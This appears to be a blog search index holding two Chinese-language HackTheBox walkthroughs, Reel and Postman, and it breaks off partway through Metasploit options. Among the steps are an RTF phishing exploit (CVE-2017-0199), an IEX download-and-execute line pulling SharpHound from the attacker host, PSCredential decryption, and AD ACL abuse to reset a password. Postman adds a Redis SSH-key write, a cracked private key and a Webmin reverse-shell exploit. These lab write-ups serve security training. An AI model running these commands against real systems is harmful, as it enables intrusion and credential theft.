<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Reel</title>
    <url>/2021/12/24/Reel/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Host discovery disabled (-Pn). All addresses will be marked <span class="string">&#x27;up&#x27;</span> and scan <span class="built_in">times</span> will be slower.</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 05:18 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.77</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 9997 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     Microsoft ftpd</span><br><span class="line">| ftp-syst: </span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)</span><br><span class="line">|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)</span><br><span class="line">|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)</span><br><span class="line">25/tcp open  smtp?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   Hello: </span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     EHLO Invalid domain address.</span><br><span class="line">|   Help: </span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">|   NULL: </span><br><span class="line">|_    220 Mail Service ready</span><br><span class="line">| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP, </span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY </span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port25-TCP:V=7.91%I=7%D=11/14%Time=6190E2F5%P=x86_64-pc-linux-gnu%r(NUL</span><br><span class="line">SF:L,18,<span class="string">&quot;220\x20Mail\x20Service\x20ready\r\n&quot;</span>)%r(Hello,3A,<span class="string">&quot;220\x20Mail\x20</span></span><br><span class="line"><span class="string">SF:Service\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n&quot;</span>)</span><br><span class="line">SF:%r(Help,54,<span class="string">&quot;220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20E</span></span><br><span class="line"><span class="string">SF:HLO\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n</span></span><br><span class="line"><span class="string">SF:&quot;</span>);</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches <span class="keyword">for</span> host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   301.22 ms 10.10.14.1</span><br><span class="line">2   301.21 ms 10.10.10.77</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 185.69 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>发现开放了21端口，可以匿名登录，并且在documents目录下发现了两个docx文件，我们将其下载下来并使用exiftool查看内容如下<img src="https://img-blog.csdnimg.cn/15c476e67c4941c6b76d60c03fdede70.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>readme.txt文件告诉我们有人正在等待 .rtf 文件并将打开它们进行审查，因为考虑到机器上正在运行 SMTP 服务，这可能是我们的目标，具有网络钓鱼攻击。<br><img src="https://img-blog.csdnimg.cn/c858f787033a4c5b8a8cbbe73d598b86.png" alt="在这里插入图片描述"></p>
<p>查阅官方文档发现，AppLocker可以阻止可执行文件和脚本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">AppLocker procedure to be documented - <span class="built_in">hash</span> rules <span class="keyword">for</span> exe, msi and scripts  (ps1,vbs,cmd,bat,js) are <span class="keyword">in</span> effect.</span><br></pre></td></tr></table></figure>

<p>我们发现Windows Event Forwarding.docx这个文件中存在一个邮箱地址<code>nico@megabank.com</code><br><img src="https://img-blog.csdnimg.cn/14102687e160477884fd2f3e6c8910a6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<!--more-->

<p>根据刚刚readme.txt的文件内容，我们可以尝试将rtf文件发送到这个地址上，我们从application字段中发现我们可以使用word文档的方式进行创建。并且我们在网上搜索看到，关于rtf文件漏洞利用是已经披露的漏洞编号<code>CVE-2017-0199</code>，此漏洞允许创建恶意 rtf 文档，在打开文档时启动 HTA（超文本应用程序)有效负载，Github 上有一个用于制作利用此漏洞的恶意文档的 Python 工具包，但也有一个 Metasploit 模块，我仍然将使用 Python 脚本。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先我们创建一个hta的载荷<br><img src="https://img-blog.csdnimg.cn/b6c156c3e5e84eebb3b7207a29673574.png" alt="在这里插入图片描述"><br>本地开启http服务器<br><img src="https://img-blog.csdnimg.cn/ebf7fdbfa46043bb84f2a0e1c331c6c7.png" alt="在这里插入图片描述"></p>
<p>然后利用这个hta脚本，创建rtf文件<br><img src="https://img-blog.csdnimg.cn/bf21d9b792054d399fe94052c21c3129.png" alt="在这里插入图片描述"><br>最后发送钓鱼邮件进行获取权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u Test -m <span class="string">&quot;Hey, take a look at this new format procedure&quot;</span> -a document.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/f64aa5ef2a984a4e92fd8dfed197da16.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>发送钓鱼邮件并开启监听，我们得到了nico账户的用户权限<br><img src="https://img-blog.csdnimg.cn/6965f266fe7341beb4fd71506ff9335b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权到TOM权限"><a href="#提权到TOM权限" class="headerlink" title="提权到TOM权限"></a>提权到TOM权限</h2><p>我们从Nico账户的桌面上看到一个cred.xml文件，文件内容包含了password字段内容<br><img src="https://img-blog.csdnimg.cn/b971324dcaa14613a8d91aa6b4997923.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>PowerShell 有一个称为 PSCredential 的对象，它提供了一种存储用户名、密码和凭据的方法。还有两个函数Import-CliXml和Export-CliXml，用于将这些凭据保存到文件中并从文件中恢复它们。该文件是Export-CliXml，我们发现Tom的密码是<code>1ts-mag1c!!!</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\nico\Desktop&gt;powershell -c <span class="string">&quot;<span class="variable">$cred</span>=Import-CliXml -Path cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br><span class="line">powershell -c <span class="string">&quot;<span class="variable">$cred</span>=Import-CliXml -Path cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br><span class="line"></span><br><span class="line">UserName       : Tom</span><br><span class="line">Password       : 1ts-mag1c!!!</span><br><span class="line">SecurePassword : System.Security.SecureString</span><br><span class="line">Domain         : HTB</span><br></pre></td></tr></table></figure>

<p>因为目标主机开放了22端口，因此我们可以连接主机的远程服务<br><img src="https://img-blog.csdnimg.cn/c0ef87585054476281e5aa1595fa284e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在tom的桌面的AD audit文件夹下发现了一个有趣的文件内容，还有一个BloodHound文件夹<br><img src="https://img-blog.csdnimg.cn/67be2e3fd4494a14bc46cd3a6af8eb45.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/e9b9cfa8736d42788e6f32b6d3b628fa.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>经过查阅文章发现，bloodhound通过csv文件形式保存文件的，都是2.0版本以前的了，那么我们现在有两个选择，一个是在目标主机上安装旧版本的bloodhound，二是将收集到的数据上传到我们攻击机上进行分析，我选择的是第二种方式。</p>
<p>首先我们将目标的脚本加载到内存中，绕过powershell的策略限制。收集到的信息保存在当前目录的一个压缩包中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">IEX(New-Object Net.WebClient).downloadString(<span class="string">&#x27;http://10.10.14.7/sharphound/SharpHound.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/44243984d10a4293a08aebd5b9748298.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>为了传输方便，我们在本地开启smb服务<br><img src="https://img-blog.csdnimg.cn/65746cbe84ba4b048fb124b74a55a741.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们在攻击机上开启bloodhound后，将压缩包拖进去进行分析，点击<code>Shortest Paths to High Value Targets</code>。为了方便筛选，我们选择tom到admin的提权路径和nico到admin的路径进行分析<br><img src="https://img-blog.csdnimg.cn/29bd464348754983b4412b33ca42a996.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/399172cccb7243948e1b64abf136697b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我知道 claire 对 Backup_Admins 组具有 WriteDacl 权限。我可以用它把她加到群里，但是事先我们先得连接到claire这个用户上。</p>
<h2 id="提权到Administrator"><a href="#提权到Administrator" class="headerlink" title="提权到Administrator"></a>提权到Administrator</h2><p>首先，我们将自己设置为 claire 帐户的所有者，以便我们可以更改她的属性；然后我们更改 claire AD 对象的访问控制列表 (ACL) 以授予我们自己 (Tom) 重置 claire 密码的权限；然后我们为该帐户选择一个新密码并将其转换为 SecureString 格式，这就是 PowerShell 用于密码的格式；我们可以使用我们选择的一个更改 claire 的密码；为了将用户添加到组，我们必须提供有效的用户凭据，因此我们声明一个 PSCredential 对象来包含 claire 的用户名和密码，因为她是对 Backup_Admins 组具有写访问权限的人；最后我们使用它来将自己添加到 Backup_Admins 组</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; import-module .\PowerView.ps1</span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt;  Set-DomainObjectOwner -Identity claire -OwnerIdentity tom                         </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-ObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword  </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; <span class="variable">$password</span>= ConvertTo-SecureString <span class="string">&#x27;Password_123!&#x27;</span> -AsPlainText -Force              </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Set-DomainUserPassword -Identity claire -AccountPassword <span class="variable">$password</span>                 </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; <span class="variable">$creds</span> = New-Object System.Management.Automation.PSCredential(<span class="string">&#x27;HTB\claire&#x27;</span>,<span class="variable">$passwor</span></span><br><span class="line">d)                                                                                                                              </span><br><span class="line">PS C:\Users\tom\Desktop\AD Audit\BloodHound&gt; Add-DomainGroupMember -Identity <span class="string">&#x27;Backup_Admins&#x27;</span> -Members <span class="string">&#x27;claire&#x27;</span> -Credential <span class="variable">$cred</span></span><br><span class="line">s</span><br></pre></td></tr></table></figure>

<p>whoami /all查看到我们已经处于backup_admins组中了<br><img src="https://img-blog.csdnimg.cn/9ff1c27957d54fe3b71bfa62126f58b1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我们还是无法查看root.txt的内容，我们却可以查看<code>Backup Scripts</code>的内容<br><img src="https://img-blog.csdnimg.cn/b4491a3626c84023b3f122732aa44800.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>但是我们在<code>BackupScript.ps1</code>中找到管理员的密码<br><img src="https://img-blog.csdnimg.cn/3285fc7c314a4f98840bb0bc74f27320.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>直接登录管理员账号<br><img src="https://img-blog.csdnimg.cn/f96c6ddacbff4775947400c9dfd03743.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>邮箱钓鱼</category>
      </categories>
      <tags>
        <tag>HackThebox</tag>
      </tags>
  </entry>
  <entry>
    <title>Postman(Redis未授权访问)</title>
    <url>/2021/12/24/Postman/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>发现目标开放了22、80、6379等常见端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root💀kali)-[~/Desktop/Scan-Scripts]</span><br><span class="line">└─<span class="comment"># ./nmap.sh 10.10.10.160</span></span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-30 07:32 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.160</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)</span><br><span class="line">|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)</span><br><span class="line">|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: The Cyber Geek<span class="string">&#x27;s Personal Website</span></span><br><span class="line"><span class="string">6379/tcp  open  redis   Redis key-value store 4.0.9</span></span><br><span class="line"><span class="string">10000/tcp open  http    MiniServ 1.910 (Webmin httpd)</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 42.85 seconds</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>我们访问一下web服务，发现只是一个普通的web页面而已<img src="https://img-blog.csdnimg.cn/31925c3c4c634d4c8dfa4491466b77e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们模糊一下网站路径</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/Scan-Scripts]</span><br><span class="line">└─<span class="comment"># dirsearch -u &quot;http://10.10.10.160&quot; -e * -x404,403,500</span></span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.4.1</span><br><span class="line"> (_||| _) (/_(_|| (_| )                                                                                                                        </span><br><span class="line">                                                                                                                                               </span><br><span class="line">Extensions: nmap.sh | HTTP method: GET | Threads: 30 | Wordlist size: 8979</span><br><span class="line"></span><br><span class="line">Output File: /root/.dirsearch/reports/10.10.10.160/_21-11-30_07-47-35.txt</span><br><span class="line"></span><br><span class="line">Error Log: /root/.dirsearch/logs/errors-21-11-30_07-47-35.log</span><br><span class="line"></span><br><span class="line">Target: http://10.10.10.160/</span><br><span class="line">                                                                                                                                               </span><br><span class="line">[07:47:35] Starting: </span><br><span class="line">[07:48:35] 301 -  310B  - /css  -&gt;  http://10.10.10.160/css/                                                                             </span><br><span class="line">[07:48:44] 301 -  312B  - /fonts  -&gt;  http://10.10.10.160/fonts/                                                             </span><br><span class="line">[07:48:48] 301 -  313B  - /images  -&gt;  http://10.10.10.160/images/                        </span><br><span class="line">[07:48:48] 200 -    2KB - /images/</span><br><span class="line">[07:48:50] 200 -    4KB - /index.html                                                                                                 </span><br><span class="line">[07:48:51] 200 -    3KB - /js/                                                                                                              </span><br><span class="line">[07:48:52] 301 -  309B  - /js  -&gt;  http://10.10.10.160/js/                   </span><br><span class="line">[07:49:25] 301 -  313B  - /upload  -&gt;  http://10.10.10.160/upload/                                                                       </span><br><span class="line">[07:49:27] 200 -    8KB - /upload/                                                                          </span><br><span class="line">                                                                                                                       </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>

<!--more-->

<p>我们发现一个upload目录，访问发现只有一些图片而已<br><img src="https://img-blog.csdnimg.cn/b3c145006edb4713a933104a79cae707.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>web攻击无果，那我们将注意力转移到redis数据库上，尝试是否存在未授权访问漏洞<br><img src="https://img-blog.csdnimg.cn/f8887a8690934a50aefef93ab24f104a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>我们首先将我们的ssh-key写入到key.txt文件中<br><img src="https://img-blog.csdnimg.cn/30cc35f7466642ae8fc852db4f111dc6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>再把key.txt文件内容写入redis缓存中<br><img src="https://img-blog.csdnimg.cn/3f83ac49ad7546059774aba3c56a198e.png" alt="在这里插入图片描述"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">10.10.10.160:6379&gt; config get dir</span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot;/var/lib/redis&quot;</span></span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> /var/lib/redis/.ssh</span><br><span class="line">(error) ERR Wrong number of arguments <span class="keyword">for</span> CONFIG <span class="built_in">set</span></span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> dir /var/lib/redis/.ssh</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">10.10.10.160:6379&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>我们尝试登录到该主机上<br><img src="https://img-blog.csdnimg.cn/795ba910f639419d8987d79f0ec483b2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们上传linpeas.sh脚本到目标主机上发现，主机的/opt目录上存在一份私钥备份</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis@Postman:~$ cat /opt/id_rsa.bak</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C</span><br><span class="line"></span><br><span class="line">JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX</span><br><span class="line">cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2</span><br><span class="line">7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6</span><br><span class="line">cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9</span><br><span class="line">1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv</span><br><span class="line">EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP</span><br><span class="line">UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY</span><br><span class="line">Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK</span><br><span class="line">t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS</span><br><span class="line">5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke</span><br><span class="line">P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6</span><br><span class="line">jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge</span><br><span class="line">SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i</span><br><span class="line">l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X</span><br><span class="line">0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p</span><br><span class="line">S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR</span><br><span class="line">hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+</span><br><span class="line">Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V</span><br><span class="line">XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD</span><br><span class="line">b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi</span><br><span class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<p>我们将其下载到本机，并使用ssh2john.py将其哈希导出<br><img src="https://img-blog.csdnimg.cn/66c4d071bea24d2bb4891441037f3a8d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后使用john进行破解得到密码，得到密码computer2008，登录到Matt账户<br><img src="https://img-blog.csdnimg.cn/40e53a09c8a549a19313e7fb22d13443.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><p>我们访问10000端口发现是个webmin应用程序，在EDB发现存在RCE漏洞并在MSF中集成<br><img src="https://img-blog.csdnimg.cn/83ea6c04c24c457e896f109ef6a6cfbf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ae16ec96fd1d44ceac7112af658419af.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>我们直接使用第二个并填写好参数后，得到root权限</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use 2</span><br><span class="line">[*] Using configured payload cmd/unix/reverse_perl</span><br><span class="line">msf6 exploit(linux/http/webmin_packageup_rce) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/linux/http/webmin_packageup_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   PASSWORD                    yes       Webmin Password</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit</span><br><span class="line">   RPORT      10000            yes       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /                yes       Base path <span class="keyword">for</span> Webmin application</span><br><span class="line">   USERNAME                    yes       Webmin Username</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (cmd/unix/reverse_perl):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes  